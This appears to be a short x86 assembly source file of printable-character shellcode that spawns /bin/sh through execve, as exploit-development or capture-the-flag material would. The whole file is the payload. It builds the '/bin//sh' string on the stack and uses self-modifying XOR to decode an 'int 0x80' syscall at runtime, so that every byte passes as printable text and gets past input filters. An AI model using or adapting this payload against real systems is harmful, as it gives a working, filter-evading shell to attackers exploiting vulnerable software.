/*
printable_sc.s
execve("/bin/sh",0,0)
*/

	     .intel_syntax noprefix
	     .globl _start
_start:
        /* set ebx */
	      push edx
	      push 0x68732f2f
	      push 0x6e69622f
        push esp
        pop ebx

        /* decode "int 0x80" */
        dec edx
        dec edx
        xor byte ptr [eax+0x20], dl /* 0x33^0xfe = 0xcd */
        xor byte ptr [eax+0x21], dl /* 0x7e^0xfe = 0x80 */
        inc edx
        inc edx

        /* set ecx */
	      push edx
	      pop ecx

        /* set eax */
        push 0x40
        pop eax
        xor al, 0x4b

        /* adjust memory layout to locate 0x33 and 0x7e */
	      push edx
	      push edx
